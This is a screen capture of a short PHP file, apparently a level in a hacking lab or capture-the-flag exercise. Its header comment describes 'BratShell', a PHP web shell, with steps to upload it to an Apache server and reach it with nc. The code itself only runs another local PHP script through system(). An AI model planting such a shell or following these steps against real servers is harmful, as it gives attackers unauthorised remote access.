GNU nano 2.5.3                                                File: /app/l1.php

<?php


/**
 *    BratShell, findsock php stateful pty shell.
 *    Author: Brian Heese
 *    Contributors: Jeroen van Rijn, Richard Clifford, Marlon Etheredge, Daniel Noel-Davies
 *    Date: 03-4-2018
 *    Dependencies: PHP >= 5.3.6
 *
 *    USAGE:
 *      1: Upload to Apache server running PHP >= 5.3.6
 *      2: nc -v [target hostname] 80
 *          GET /fd.php HTTP/1.0
 *
 *      [shell magically spawns]
 *      $SINIT (<-- optional in case you want a pretty pty shell *python must be installed on server* )
 *
 */

// Kill xdebug if available
if(function_exists('xdebug_disable')) { xdebug_disable(); }

// Disable timing out as we wish to facilitate a stateful shell session.
set_time_limit(0);

// TODO: Set debug info to false when releasing to production.
ini_set('error_reporting', E_ALL);
ini_set('display_errors', true);

echo system('bash -c "php ./level-2.php"');
